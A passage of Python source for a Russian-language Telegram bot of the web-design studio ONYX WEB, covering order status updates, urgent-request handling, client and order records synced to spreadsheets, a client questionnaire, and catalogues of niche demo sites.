        lines.append(f"⏱ Примерный срок: {ps_eta(key)}")
    lines.append(f"👨‍💻 Разработчик: @{DEVELOPER_USERNAME}")
    if o.get("urgent_request"):
        lines.append("\n⚡ Запрос на ускорение принят - команда проверяет возможность.")
    return "\n".join(lines), my_order_active_kb(o["id"])


def request_urgent(chat_id, user, uid, oid):
    o = order_get(oid)
    if not o or o.get("uid") != uid:
        send(chat_id, "Заказ не найден.", MAIN_MENU)
        return
    if o.get("urgent_request"):
        send(chat_id, "Мы уже получили ваш запрос на ускорение и работаем над ним 🙌", MAIN_MENU)
        return
    o["urgent_request"] = True
    o["updated"] = now_str()
    order_save(o)
    sheet_order(o)
    key = proj_status(o)
    uname = f"@{user.get('username')}" if user.get("username") else "-"
    names = ", ".join(SERVICE.get(c, {}).get("name", c) for c in o.get("items", [])) or "-"
    cm = o.get("service_comments") or {}
    cm_txt = " | ".join(f"{SERVICE.get(c, {}).get('name', c)}: {t}" for c, t in cm.items()) or "-"
    p = user_get(uid) or {}
    sheet_post("ClientRequests", {
        "type": "urgent", "date": now_str(), "telegram_id": uid, "username": uname,
        "order_id": oid, "project_status": key, "services": names, "comment": cm_txt,
    })
    log_event(uid, "urgent", str(oid))
    create_task("order", oid, f"Проверить возможность ускорения (заказ №{oid})",
                telegram_id=uid, order_id=oid, priority="urgent", notify=False)
    notify_admins("⚡ <b>Клиент просит ускорить проект:</b>\n"
                  f"Клиент: {p.get('name', '-')}\n"
                  f"Telegram: {uname}\n"
                  f"Order ID: {oid}\n"
                  f"Статус проекта: {ps_label(key)}\n"
                  f"Услуги: {names}\n"
                  f"Комментарий: {cm_txt}")
    send(chat_id, "Мы получили ваш запрос. Команда ONYX проверит возможность ускорения "
                  "проекта и свяжется с вами.", MAIN_MENU)


def on_order_completed(o):
    """Спец-логика при статусе completed: привязка сайта, уведомление, запуск отзыва, активация услуг."""
    cuid = o.get("uid")
    if not cuid:
        return
    mark_purchased(cuid, o.get("items", []))  # активируем купленные услуги в профиле
    # ТЗ п.5: автоматическая привязка сайта клиента к профилю (без ручного добавления),
    # дальше эта ссылка используется в отзывах, админке и личном кабинете.
    site_url = ""
    try:
        pr = prod_get(o["id"])
        if pr:
            dn = pr.get("domain_name", "")
            site_url = (pr.get("production_url") or pr.get("vercel_preview_url")
                        or (f"https://{dn}" if dn else ""))
        if site_url:
            p = user_get(cuid) or {}
            p["website"] = site_url
            user_save(cuid, p)
            sheet_client(p)
    except Exception as e:
        print("site auto-bind err", e)
    kb = {"inline_keyboard": [[{"text": "🌐 Открыть сайт", "url": site_url or SITE_URL}]]}
    send(cuid, "🎉 <b>Ваш сайт готов!</b>\nПроверьте его и убедитесь, что всё нравится 👇", kb)
    p = user_get(cuid) or {}
    review_start(cuid, cuid, p.get("username", ""), order_id=o.get("id"), intro=True)


def apply_project_status(oid, key, notify=True):
    """Сменить статус проекта, сохранить в Orders, уведомить клиента."""
    o = order_get(oid)
    if not o:
        return None
    prev = o.get("status")
    o["status"] = key
    o["updated"] = now_str()
    if key in ("paid_waiting_start", "completed") and not o.get("paid") and o.get("payment_status") == "paid":
        o["paid"] = True
    order_save(o)
    sheet_order(o)
    cuid = o.get("uid")
    # Гейт оплаты: как только сайт УТВЕРЖДЁН - создаём задачу на счёт через «Мой налог»
    if key == "approved":
        create_task("order", oid, f"Выставить счёт по реквизитам (заявка №{oid})",
                    description=(f"Сумма: {fmt_amount(o.get('total', 0))}. Клиент утвердил сайт.\n"
                                 f"Чек - через «Мой налог» (422-ФЗ). Реквизиты ONYX:\n{ONYX_LEGAL}"),
                    telegram_id=cuid, order_id=oid, priority="high", notify=True)
    if key == "invoice_issued" and cuid:
        log_event(cuid, "invoice_requested", str(oid))
    # Core: журнал смены статуса заявки (по client_id)
    try:
        if cuid:
            aid = o.get("application_id")
            if aid:
                application_set_status(aid, key, actor="admin")
            else:
                journal_add(client_id_of(cuid), "app_status_change", prev=prev, new=key, extra=f"order#{oid}")
    except Exception as e:
        print("journal status err", e)
    if key == "completed":
        on_order_completed(o)
    elif notify and cuid:
        send(cuid, "🔔 <b>Статус вашего проекта обновлён:</b>\n"
                   f"{ps_label(key)}\n{ps_desc(key)}")
    return o


def admin_status_kb(oid):
    rows, row = [], []
    for key in PROJECT_STATUS:
        row.append({"text": PROJECT_STATUS[key]["label"], "callback_data": f"setstatus:{oid}:{key}"})
        if len(row) == 2:
            rows.append(row); row = []
    if row:
        rows.append(row)
    return {"inline_keyboard": rows}


def sheet_post(table, row):
    row = dict(row)
    row["table"] = table
    post_to_sheet(row)


def sheet_client(p):
    sheet_post("Clients", {
        "client_id": p.get("client_id", ""), "telegram_id": p.get("telegram_id", ""),
        "username": p.get("username", ""), "name": p.get("name", ""),
        "phone": p.get("phone", ""), "city": p.get("city", ""),
        "niche": p.get("niche", ""), "website": p.get("website", ""),
        "client_status": p.get("client_status", ""),
        "questionnaire_status": p.get("questionnaire_status", ""),
        "subscription_status": p.get("subscription_status", ""),
        "created_at": p.get("created", ""), "updated_at": p.get("updated", ""),
    })


def sheet_questionnaire(uid, username, d):
    _set(f"onyx:quest:{uid}", d, ttl=YEAR)  # локально - для промпта дизайна и модуля домена
    _cid = (user_get(uid) or {}).get("core_client_id", "")
    sheet_post("Questionnaire", {
        "questionnaire_id": f"Q{uid}-{int(time.time())}", "client_id": _cid, "telegram_id": uid,
        "username": username,
        "company_name": d.get("company_name", ""), "niche": d.get("niche", ""),
        "city": d.get("city", ""), "business_description": d.get("business_description", ""),
        "main_services": d.get("main_services", ""), "priority_services": d.get("priority_services", ""),
        "show_prices": d.get("show_prices", ""), "advantages": d.get("advantages", ""),
        "target_audience": d.get("target_audience", ""), "main_action": d.get("main_action", ""),
        "special_offer": d.get("special_offer", ""), "style_preferences": d.get("style_preferences", ""),
        "color_preferences": d.get("color_preferences", ""), "reference_sites": d.get("reference_sites", ""),
        "phone": d.get("phone", ""), "messengers": d.get("messengers", ""),
        "email": d.get("email", ""), "address": d.get("address", ""),
        "working_hours": d.get("working_hours", ""), "social_links": d.get("social_links", ""),
        "has_logo": d.get("has_logo", ""), "has_photos": d.get("has_photos", ""),
        "additional_functions": d.get("additional_functions", ""), "has_domain": d.get("has_domain", ""),
        "domain_name": d.get("domain_name", ""), "must_have": d.get("must_have", ""),
        "must_not_have": d.get("must_not_have", ""), "status": "filled",
        "created_at": now_str(), "updated_at": now_str(),
    })


def fmt_service_comments(o):
    """Комментарии к услугам в читаемую строку для таблицы."""
    cm = o.get("service_comments") or {}
    if not cm:
        return o.get("comment", "")
    return " | ".join(f"{SERVICE.get(cid, {}).get('name', cid)}: {txt}" for cid, txt in cm.items())


def sheet_order(o):
    pay_status = o.get("payment_status") or ("paid" if o.get("paid") else "pending")
    sheet_post("Orders", {
        "order_id": o.get("id", ""), "telegram_id": o.get("uid", ""),
        "services": ", ".join(o.get("items", [])),
        "service_comments": fmt_service_comments(o),
        "total_amount": o.get("total", 0),
        "payment_method": o.get("payment_method") or o.get("payment_type", ""),
        "payment_status": pay_status,
        "order_status": o.get("status", ""),
        "created_at": o.get("created", ""),
        "updated_at": o.get("updated") or o.get("created", ""),
    })


def register_client(uid, user):
    p = user_get(uid)
    if not p:
        p = {
            "client_id": uid, "telegram_id": uid,
            "username": user.get("username") or "", "name": user.get("first_name") or "",
            "phone": "", "city": "", "niche": "", "website": "",
            "client_status": "new", "questionnaire_status": "not_filled",
            "subscription_status": "inactive",
            "active_services": [], "purchased_services": [],
            "created": now_str(), "updated": now_str(),
            "orders": [], "referrals": 0,
        }
        user_save(uid, p)
        subscribe(uid)
        sheet_client(p)
    else:
        changed = False
        if user.get("username") and p.get("username") != user.get("username"):
            p["username"] = user.get("username"); changed = True
        if not p.get("name") and user.get("first_name"):
            p["name"] = user.get("first_name"); changed = True
        for k, v in (("client_status", "new"), ("questionnaire_status", "not_filled"),
                     ("subscription_status", "inactive"), ("telegram_id", uid), ("client_id", uid)):
            if not p.get(k):
                p[k] = v; changed = True
        if changed:
            p["updated"] = now_str(); user_save(uid, p)
    # Core: создать/связать клиента с раздельным client_id (дедуп + журнал)
    try:
        ensure_client(uid, user)
    except Exception as e:
        print("ensure_client err", e)
    return p


def mark_questionnaire_filled(uid, data):
    p = user_get(uid) or {}
    p["questionnaire_status"] = "filled"
    p["client_status"] = "questionnaire_completed"
    if data.get("niche"):
        p["niche"] = data["niche"]
    if data.get("city"):
        p["city"] = data["city"]
    if data.get("phone"):
        p["phone"] = data["phone"]
    if data.get("company_name"):
        p["name"] = data["company_name"]
    if data.get("has_domain") == "Да, есть" and data.get("domain_name"):
        p["website"] = data["domain_name"]
    p["updated"] = now_str()
    user_save(uid, p)
    sheet_client(p)


def render_cabinet(uid):
    p = user_get(uid)
    if not p:
        return ("👤 <b>Личный кабинет</b>\n\n"
                "Здесь появятся ваши данные, заказы и статусы. "
                "Оставьте заявку или соберите заказ - и профиль создастся автоматически.")
    lines = ["👤 <b>Личный кабинет</b>", ""]
    lines.append(f"Имя: {p.get('name', '-')}")
    lines.append(f"Контакт: {p.get('contact', '-')}")
    lines.append("")
    orders = p.get("orders", [])
    if not orders:
        lines.append("📦 <b>Заказы:</b> пока нет.")
    else:
        lines.append("📦 <b>Ваши заказы:</b>")
        for oid in orders[-10:]:
            o = order_get(oid)
            if not o:
                continue
            st = STATUS.get(o.get("status", "new"), o.get("status"))
            items = ", ".join(o.get("items", [])) or "-"
            lines.append(f"• №{oid} - {items} - {o.get('total', 0)} ₽ - {st}")
    return "\n".join(lines)


# ------------------------- Тексты -------------------------
WELCOME = (
    "👋 <b>ONYX WEB</b>\n"
    "<i>Сайты для бизнеса · разработка 0 ₽</i>\n\n"
    "Сначала показываем готовый сайт, потом говорим о деньгах.\n"
    "Понравится - оплачиваете запуск и публикуем.\n"
    "Не понравится - расходимся, вы ничего не должны.\n\n"
    "<b>С чего начнём?</b>"
)
WELCOME_KB = {"inline_keyboard": [[{"text": "✅ Заполнить заявку на сайт", "callback_data": "brief:start"}]]}
# CHECKLIST - удалён: раздел заменён (см. «Поддержка» / «Информативный ONYX»).
TARIFFS_INFO = (
    "💰 <b>Оффер ONYX WEB</b>\n\n"
    "• Разработка сайта - <b>0 ₽</b>\n"
    "• Запуск под ключ - <b>от 5 990 ₽</b>\n"
    "• Доп.опции - от 2 500 ₽ (см. «🛒 Тарифы и услуги»)\n\n"
    "Оплата - по счёту (реквизиты), чек через «Мой налог» (422-ФЗ), после утверждения сайта.\n"
    f"Подробнее: {SITE_URL}"
)
# PARTNER_INFO удалён - заменён на PARTNER_TEXT / PARTNER_HOW (Этап 9).


# ------------------------- Главное меню -------------------------
MAIN_MENU = {"keyboard": [
    [{"text": "🔍 Бесплатный аудит"}],
    [{"text": "🖼 Примеры сайтов"}, {"text": "🛒 Тарифы и услуги"}],
    [{"text": "📦 Мой заказ"}, {"text": "👤 Личный кабинет"}],
    [{"text": "🤝 Стать партнёром"}, {"text": "⭐ Отзывы ONYX"}],
    [{"text": "🆘 Поддержка"}, {"text": "📄 Документы"}],
], "resize_keyboard": True}


def main_menu(chat_id, text=WELCOME):
    send(chat_id, text, MAIN_MENU)


# ------------------------- Анкета -------------------------
BRIEF_STEPS = [
    # --- Универсальное ядро: 13 вопросов. Каждый закрывает конкретное поле,
    # без которого не собирается производственный промпт №1. Ничего «для галочки».
    {"key": "company_name", "icon": "🏢", "q": "Как называется ваша компания?",
     "hint": "Как хотите, чтобы вас называли на сайте", "text": True},
    {"key": "city", "icon": "📍", "q": "Город и география работы?",
     "hint": "Например: Пермь и Пермский район · или «вся Россия»", "text": True},
    {"key": "main_services", "icon": "🛠", "q": "Какие услуги или товары вы продаёте?",
     "hint": "Через запятую. ПЕРВЫМ укажите то, что важнее всего продавать", "text": True},
    {"key": "advantages", "icon": "🏆", "q": "Почему клиенты выбирают именно вас?",
     "hint": "Сильные стороны, чем вы лучше конкурентов", "text": True},
    {"key": "trust_facts", "icon": "🛡", "q": "Что вызывает доверие к вам - и что обычно смущает клиентов?",
     "hint": "Гарантии, опыт, как строится работа + частые сомнения, которые вы слышите",
     "text": True},
    {"key": "target_audience", "icon": "🎯", "q": "Кто ваши клиенты и с каким запросом приходят?",
     "hint": "Например: собственники квартир, которым нужен ремонт под ключ", "text": True},
    {"key": "main_action", "icon": "👉", "q": "Какое главное действие должен совершить посетитель сайта?",
     "opts": ["📝 Оставить заявку", "📞 Позвонить", "💬 Написать в мессенджер",
              "🗓 Записаться", "🛒 Оформить заказ"]},
    {"key": "show_prices", "icon": "💰", "q": "Показывать цены на сайте?",
     "opts": ["Да, показывать цены", "Только «от …» / по запросу", "Нет, цены не показывать"]},
    {"key": "phone", "icon": "📞", "q": "Телефон для связи?", "text": True, "contact": True},
    {"key": "contacts_extra", "icon": "✈️", "q": "Остальные контакты - одним сообщением",
     "hint": "Telegram/WhatsApp,e-mail, адрес, график работы, соцсети", "text": True},
    {"key": "materials", "icon": "📎", "q": "Что у вас уже есть из материалов?",
     "hint": "Отметьте всё, что есть - это сильно влияет на качество сайта",
     "multi": [("has_logo", "Логотип"), ("has_photos", "Фото компании/работ"),
               ("has_portfolio", "Портфолио, примеры работ"), ("has_reviews", "Отзывы клиентов"),
               ("documents", "Лицензии, сертификаты")]},
    {"key": "domain_site", "icon": "🌐", "q": "Есть свой домен или действующий сайт?",
     "hint": "Напишите адрес - или «нет», если ничего нет", "text": True},
    {"key": "style_wishes", "icon": "🎨", "q": "Пожелания по стилю сайта?",
     "hint": "Настроение, цвета, ссылки на сайты, которые нравятся. Можно пропустить",
     "text": True, "opt": True},
]
BRIEF_LABELS = {
    "company_name": "🏢 Компания", "niche": "🧭 Ниша", "city": "📍 Город",
    "business_description": "📝 Деятельность", "main_services": "🛠 Услуги/товары",
    "priority_services": "⭐ Приоритетные услуги", "show_prices": "💰 Цены на сайте",
    "advantages": "🏆 Преимущества", "target_audience": "🎯 Аудитория",
    "main_action": "👉 Главное действие", "special_offer": "🎁 Акция",
    "style_preferences": "🎨 Стиль", "color_preferences": "🌈 Цвета",
    "reference_sites": "🔗 Референсы", "phone": "📞 Телефон", "messengers": "✈️ Мессенджеры",
    "email": "📧 Email", "address": "🏠 Адрес", "working_hours": "🕒 График",
    "social_links": "📱 Соцсети", "has_logo": "🖼 Логотип", "has_photos": "📸 Фото",
    "additional_functions": "⚙️ Доп.функции", "has_domain": "🌐 Домен",
    "domain_name": "🔤 Название домена", "must_have": "✅ Обязательно",
    "must_not_have": "🚫 Не должно быть",
    "guarantees": "🛡 Гарантии", "experience": "🎖 Опыт/команда", "stages": "🪜 Этапы работы",
    "avg_check": "💵 Средний чек", "objections": "🤔 Возражения",
    "typical_request": "💬 Типичный запрос", "seo_queries": "🔎 SEO-запросы",
    "geo": "🗺 География", "documents": "📄 Документы",
    "has_portfolio": "🖼 Портфолио", "has_reviews": "⭐ Отзывы",
    # новые объединённые поля короткой анкеты
    "trust_facts": "🛡 Доверие (гарантии, опыт, процесс)",
    "contacts_extra": "✈️ Контакты и график", "materials": "📎 Материалы",
    "domain_site": "🌐 Домен / текущий сайт", "style_wishes": "🎨 Стиль и референсы",
}

# ============================================================================
#  НИШИ И ДИНАМИЧЕСКАЯ АНКЕТА
#  (документ «ONYX - Логика выбора ниши и формирования анкеты»)
#  Анкета = универсальное ядро (BRIEF_STEPS) + нишевой блок + правки под цель.
#  Нишевой вопрос может ЗАМЕНЯТЬ общий (replaces), чтобы анкета не раздувалась.
# ============================================================================
# Первые шесть - ниши, под которые у нас есть собственный демо-сайт.
# Их видно без прокрутки, и человек сразу попадает на готовый пример своей сферы.
NICHES = [
    ("dental", "🦷 Стоматологии и медклиники"),
    ("legal", "⚖️ Юридические услуги"),
    ("realty", "🏘 Недвижимость и агентства"),
    ("fitness", "🏋️ Фитнес-клубы и студии"),
    ("furniture", "🛋 Мебель и интерьер"),
    ("b2b", "💼 B2B-услуги и консалтинг"),
    # дальше - ниши без своего демо, показываем ближайшее по духу
    ("construction", "🏗 Строительство и ремонт"),
    ("beauty", "💅 Салоны красоты и косметология"),
    ("auto", "🚗 Автосервисы и детейлинг"),
    ("manufacturing", "🏭 Производственные компании"),
    ("food", "🍽 Рестораны, кафе и доставка"),
    ("hotel", "🏨 Отели и базы отдыха"),
    ("education", "🎓 Образовательные центры"),
    ("logistics", "🚚 Логистика и грузоперевозки"),
    ("other", "🧩 Другое"),
]
NICHES_WITH_DEMO = 14     # своё демо есть у каждой ниши, кроме «Другое»
NICHE_RU = dict(NICHES)

# ============================================================================
#  ЖИВЫЕ ДЕМО С САЙТА
#  У большинства клиентов сайта нет - чинить нечего, надо показать результат.
#  Человек видит готовый сайт из своей ниши раньше, чем мы спросим хоть что-то.
# ============================================================================

# Якорь секции с 3D-галереей демо на сайте (id секции - templates).
CASES_URL = "https://onyx-web.ru/#templates"

# ⚠️ ЕДИНСТВЕННОЕ МЕСТО, ГДЕ ПРАВЯТСЯ ССЫЛКИ НА ДЕМО.
# Вставьте прямой адрес каждого демо-сайта в поле "url".
# Пока поле пустое - кнопка ведёт в галерею на onyx-web.ru.
DEMOS = {
    "artel": {"name": "Artel Interiors", "tag": "Премиум-интерьеры",
              "what": "Имидж-сайт: портфолио объектов, процесс работы и заявка с каждого экрана.",
              "url": "https://onyx-web.ru/#case/artel"},
    "dental": {"name": "DentalArt", "tag": "Медицина",
               "what": "Врачи, услуги с ценами и онлайн-запись - заявки идут прямо с рекламы.",
               "url": "https://onyx-web.ru/#case/dental"},
    "ironcore": {"name": "Iron Core", "tag": "Спорт",
                 "what": "Направления, тренеры, абонементы и запись на пробное занятие.",
                 "url": "https://onyx-web.ru/#case/fitness"},
    "prime": {"name": "Prime Logistics", "tag": "Логистика",
              "what": "Калькулятор расчёта и короткие формы - клиент считает сам и оставляет заявку.",
              "url": "https://onyx-web.ru/#case/logistics"},
    "egorov": {"name": "Egorov & Partners", "tag": "Право",
               "what": "Направления практики, кейсы с результатом и запись на консультацию.",
               "url": "https://onyx-web.ru/#case/lawfirm"},
    "vanguard": {"name": "Vanguard Estates", "tag": "Недвижимость",
                 "what": "Каталог объектов с фильтрами и подбором - человек находит своё за два клика.",
                 "url": "https://onyx-web.ru/#case/realestate"},
    "osnova": {"name": "Osnova", "tag": "Строительство",
               "what": "Калькулятор дома, сданные объекты с ценой по договору и шесть этапов работ.",
               "url": "https://onyx-web.ru/#case/construction"},
    "fleur": {"name": "Fleur", "tag": "Красота и косметология",
              "what": "Журнальная подача, мастера, прайс и запись на бесплатную диагностику.",
              "url": "https://onyx-web.ru/#case/beauty"},
    "apex": {"name": "Apex", "tag": "Автосервис и детейлинг",
             "what": "Прайс по кодам работ, правила сервиса и запись на диагностику.",
             "url": "https://onyx-web.ru/#case/auto"},
    "forma": {"name": "Forma", "tag": "Производство",
              "what": "Парк оборудования с допусками, маршрут заказа и расчёт по чертежу.",
              "url": "https://onyx-web.ru/#case/manufacturing"},
    "brasero": {"name": "Brasero", "tag": "Рестораны и доставка",
                "what": "Живое меню по категориям, залы, доставка и бронь столика.",
                "url": "https://onyx-web.ru/#case/food"},
    "taiga": {"name": "Taiga", "tag": "Отели и базы отдыха",
              "what": "Домики, территория, сезоны и расчёт стоимости проживания.",
              "url": "https://onyx-web.ru/#case/hotel"},
    "method": {"name": "Method", "tag": "Образование",
               "what": "Программы по уровням, результаты выпускников и запись на пробный урок.",
               "url": "https://onyx-web.ru/#case/education"},
    "vector": {"name": "Vector", "tag": "Услуги для бизнеса",
               "what": "Услуги с ценами, порядок работы, тарифы и запрос диагностики.",
               "url": "https://onyx-web.ru/#case/b2b"},
}


# Что показать в карточке демо. Три-четыре пункта - ровно столько, сколько
# человек прочитает, прежде чем решить, открывать сайт или нет.
DEMO_CARD = {
    "artel":    {"pages": "Одна длинная страница", "emoji": "🛋",
                 "has": ["Портфолио объектов с фото до и после",
                         "Процесс работы по шагам",
                         "Форма заявки на каждом экране"],
                 "why": "Когда решение принимают глазами: интерьеры, ремонт, дизайн."},
    "dental":   {"pages": "Одна страница", "emoji": "🦷",
                 "has": ["Врачи с опытом и специализацией",
                         "Услуги с ценами, без «от» и звёздочек",
                         "Онлайн-запись прямо с рекламы"],
                 "why": "Когда клиент выбирает врача, а не клинику."},
    "ironcore": {"pages": "Одна страница", "emoji": "🏋",
                 "has": ["Направления и расписание",
                         "Тренеры с регалиями",
                         "Абонементы и запись на пробное"],
                 "why": "Когда надо привести человека на первое занятие."},
    "prime":    {"pages": "Одна страница", "emoji": "🚚",
                 "has": ["Калькулятор доставки",
                         "Короткие формы в два поля",
                         "География и сроки"],
                 "why": "Когда клиент хочет посчитать сам, до разговора."},
    "egorov":   {"pages": "Одна страница", "emoji": "⚖️",
                 "has": ["Направления практики",
                         "Кейсы с результатом и суммой",
                         "Запись на консультацию"],
                 "why": "Когда продаёт репутация и доказанный результат."},
    "vanguard": {"pages": "Одна страница", "emoji": "🏙",
                 "has": ["Каталог объектов с фильтрами",
                         "Подбор по параметрам",
                         "Заявка на просмотр"],
                 "why": "Когда объектов много и нужен быстрый поиск."},
    "osnova":   {"pages": "Четыре страницы", "emoji": "🧱",
                 "has": ["Каталог проектов домов",
                         "Проект внутри: планировки и конструктив",
                         "Открытый прайс по работам",
                         "Калькулятор бюджета"],
                 "why": "Когда цикл сделки длинный и клиент долго изучает."},
    "fleur":    {"pages": "Одна страница", "emoji": "💐",
                 "has": ["Журнальная подача, много воздуха",
                         "Мастера и их работы",
                         "Прайс со временем процедур",
                         "Загруженность по дням недели"],
                 "why": "Когда важна эстетика и доверие к мастеру."},
    "apex":     {"pages": "Одна страница", "emoji": "🏎",
                 "has": ["Прайс с пересчётом по классу авто",
                         "Замеры толщины покрытия",
                         "Правила сервиса и гарантии"],
                 "why": "Когда клиент боится, что накрутят по ходу."},
    "forma":    {"pages": "Две страницы", "emoji": "⚙️",
                 "has": ["Парк оборудования с полями и допусками",
                         "Маршрут заказа от чертежа до отгрузки",
                         "Загрузка производства по месяцам"],
                 "why": "Когда покупатель - инженер и ему нужны цифры."},
    "brasero":  {"pages": "Три страницы", "emoji": "🔥",
                 "has": ["Живое меню по категориям",
                         "Банкетные сеты и расчёт на компанию",
                         "Залы, доставка, бронь столика"],
                 "why": "Когда меню меняется и его надо показывать целиком."},
    "taiga":    {"pages": "Три страницы", "emoji": "🌲",
                 "has": ["Домики с планировками",
                         "Схема территории",
                         "Расчёт стоимости проживания"],
                 "why": "Когда человек выбирает, куда поехать на выходные."},
    "method":   {"pages": "Две страницы", "emoji": "📚",
                 "has": ["Программы по уровням",
                         "Помесячный план курса и расписание",
                         "Результаты выпускников в цифрах"],
                 "why": "Когда родитель сравнивает вас с тремя другими."},
    "vector":   {"pages": "Пять страниц", "emoji": "📊",
                 "has": ["Отдельная страница под каждую услугу",
                         "Кейсы с цифрами до и после",
                         "Тарифы на обслуживание"],
                 "why": "Когда услуг много и каждую надо объяснить."},
}

# Одна ниша - один сайт. Теперь у каждой ниши есть собственное демо.
DEMO_BY_NICHE = {
    "dental":        "dental",
    "legal":         "egorov",
    "realty":        "vanguard",
    "fitness":       "ironcore",
    "furniture":     "artel",
    "b2b":           "vector",
    "construction":  "osnova",
    "beauty":        "fleur",
    "auto":          "apex",
    "manufacturing": "forma",
    "food":          "brasero",
    "hotel":         "taiga",
    "education":     "method",
    "logistics":     "prime",
    "other":         "vector",
}


def demos_for(niche):
    """Ровно один пример на нишу."""
    did = DEMO_BY_NICHE.get(niche) or DEMO_BY_NICHE["other"]
    return [(did, DEMOS[did])] if did in DEMOS else []


def demo_link(d):
    return d.get("url") or CASES_URL


def demos_md(niche):
    label = NICHE_RU.get(niche, "").split(" ", 1)[-1].lower()
    own = niche in [n for n, _ in NICHES[:NICHES_WITH_DEMO]]
    md = ["# 👀 Сначала посмотрите, что получится", "",
          (f"Готовый сайт для ниши «{label}» - открывается по кнопке ниже, можно потыкать."
           if own else
           f"Своего примера под «{label}» пока нет, поэтому показываем ближайший "
           f"по задаче - уровень и подход будут те же."), "",
          "---", ""]
    for _, d in demos_for(niche):
        md += [f"### {d['name']} · {d['tag']}", d["what"], ""]
    md += ["---", "",
           "> Ваш сайт будет не таким же, а таким же по уровню: своя структура, "
           "свои услуги, свои фотографии. Эти - чтобы вы понимали качество.", "",
           "Дальше несколько вопросов о вашем бизнесе - 5-10 минут."]
    return "\n".join(md)


def demos_kb(niche):
    rows = [[{"text": f"🔗 Открыть {d['name']}", "url": demo_link(d)}]
            for _, d in demos_for(niche)]
    rows.append([{"text": "▶️ Продолжить - вопросы о бизнесе", "callback_data": "demo:go"}])
    rows.append([{"text": "⬅️ Другая ниша", "callback_data": "brief:niche"}])
    return {"inline_keyboard": rows}


def gallery_md():
    """Витрина примеров. Раньше здесь был длинный список с описанием каждого
    сайта подряд - четырнадцать абзацев, которые никто не дочитывал, и стена
    из четырнадцати одинаковых ссылок под ними.

    Теперь короткий текст и кнопки-карточки: человек выбирает свою отрасль,
    читает про один сайт и уже осознанно решает открывать его или нет."""
    return "\n".join([
        "# 🖼 Примеры наших работ", "",
        f"**{len(DEMOS)} готовых сайтов** под разные отрасли. Не картинки, "
        "а живые страницы: можно листать, кликать меню и заполнять формы.", "",
        "Выберите отрасль ближе к вашей - расскажу, что внутри и зачем "
        "сделано именно так.", "",
        "> Названия и цифры на демо придуманы. Ваш сайт собираем "
        "с вашим содержанием: свои услуги, свои фото, свои отзывы.",
    ])


# Порядок в витрине: сначала то, что заказывают чаще.
GALLERY_ORDER = ["dental", "ironcore", "fleur", "osnova", "apex", "artel",
                 "brasero", "taiga", "vanguard", "prime", "method",
                 "egorov", "forma", "vector"]


def gallery_kb():
    """Сетка карточек в два столбца: четырнадцать кнопок в один ряд
    занимают целый экран, а парами читаются как каталог."""
    ids = [k for k in GALLERY_ORDER if k in DEMOS] + \
          [k for k in DEMOS if k not in GALLERY_ORDER]
    rows, pair = [], []
    for k in ids:
        c = DEMO_CARD.get(k, {})
        pair.append({"text": f"{c.get('emoji', '▪️')} {DEMOS[k]['tag']}",
                     "callback_data": f"gal:d:{k}"})
        if len(pair) == 2:
            rows.append(pair); pair = []
    if pair:
        rows.append(pair)
    rows.append([{"text": "🖼 Смотреть все на сайте", "url": CASES_URL}])
    # Человек, который листает примеры, ещё выбирает. Звать его «оформить»
    # рано - зовём обсудить: это тот же шаг воронки, но без давления.
    rows.append([{"text": "🎯 Обсудить свой сайт - бесплатно",
                  "callback_data": "cons:offer"}])
    rows.append([{"text": "🚀 Хочу такой же", "callback_data": "brief:start"}])
    rows.append([{"text": "🏠 В меню", "callback_data": "b:home"}])
    return {"inline_keyboard": rows}


def demo_card_md(key):
    """Карточка одного примера: что это, что внутри и кому подходит."""
    d = DEMOS.get(key)
    if not d:
        return "Пример не найден."
    c = DEMO_CARD.get(key, {})
    md = [f"# {c.get('emoji', '🔗')} {d['name']}",
          f"*{d['tag']} · {c.get('pages', 'одна страница')}*", "",
          d["what"], ""]
    if c.get("has"):
        md += ["### Что внутри", ""]
        md += [f"- {x}" for x in c["has"]]
        md += [""]
    if c.get("why"):
        md += [f"> **Кому подходит.** {c['why']}", ""]
    md += ["Откройте с телефона - увидите ровно то, что увидит ваш клиент."]
    return "\n".join(md)


def demo_card_kb(key):
    d = DEMOS.get(key) or {}
    return {"inline_keyboard": [
        [{"text": "🔗 Открыть сайт", "url": demo_link(d)}],
        [{"text": "🎯 Хочу такой же - обсудить", "callback_data": "cons:offer"}],
        [{"text": "📝 Сразу заполнить анкету", "callback_data": "brief:start"}],
        [{"text": "⬅️ Все примеры", "callback_data": "gallery:open"},
         {"text": "🏠 В меню", "callback_data": "b:home"}],
    ]}


def show_demos(chat_id, uid, mid, niche):
    """Экран с примерами. Скриншотов нет намеренно: превью только засоряет чат,
    а живой сайт всё равно смотрят по ссылке."""
    edit_rich(chat_id, mid, demos_md(niche), reply_markup=demos_kb(niche))

YESNO = ["Да, есть", "Нет"]

# Нишевые блоки. replaces - какие вопросы ядра этот блок закрывает сам.
NICHE_BLOCKS = {
    # 2-3 вопроса на нишу - только то, чего НЕТ в универсальном ядре и без чего
    # промпт получится общим. Материалы (лого/фото/портфолио) спрашиваются в ядре.
    "construction": {"replaces": [], "steps": [
        {"key": "work_types", "icon": "🔨", "q": "Какие виды работ вы выполняете?",
         "hint": "Например: отделка под ключ, кровля, фасады", "text": True},
        {"key": "main_objects", "icon": "🏢", "q": "На каких объектах работаете чаще всего?",
         "hint": "Квартиры, частные дома, коммерческие помещения", "text": True},
    ]},
    "dental": {"replaces": [], "steps": [
        {"key": "doctors", "icon": "👨‍⚕️", "q": "Какие врачи и специалисты у вас принимают?",
         "hint": "Специализации, опыт", "text": True},
        {"key": "equipment", "icon": "🔬", "q": "Какое оборудование и технологии используете?",
         "hint": "Можно пропустить", "text": True, "opt": True},
    ]},
    "auto": {"replaces": [], "steps": [
        {"key": "car_brands", "icon": "🚘", "q": "Какие марки автомобилей обслуживаете?", "text": True},
        {"key": "waiting_area", "icon": "☕", "q": "Есть зона ожидания для клиентов?", "opts": YESNO},
    ]},
    "manufacturing": {"replaces": [], "steps": [
        {"key": "production_what", "icon": "⚙️", "q": "Что именно вы производите?", "text": True},
        {"key": "b2b_or_b2c", "icon": "🤝", "q": "С кем работаете в первую очередь?",
         "opts": ["Только B2B (компании)", "Только B2C (частные лица)", "И B2B, и B2C"]},
    ]},
    "legal": {"replaces": [], "steps": [
        {"key": "law_areas", "icon": "📚", "q": "По каким направлениям права работаете?", "text": True},
        {"key": "consult_format", "icon": "💬", "q": "В каком формате проходят консультации?",
         "opts": ["Очно в офисе", "Онлайн", "Очно и онлайн"]},
    ]},
    "realty": {"replaces": [], "steps": [
        {"key": "realty_types", "icon": "🏠", "q": "С какими объектами работаете?",
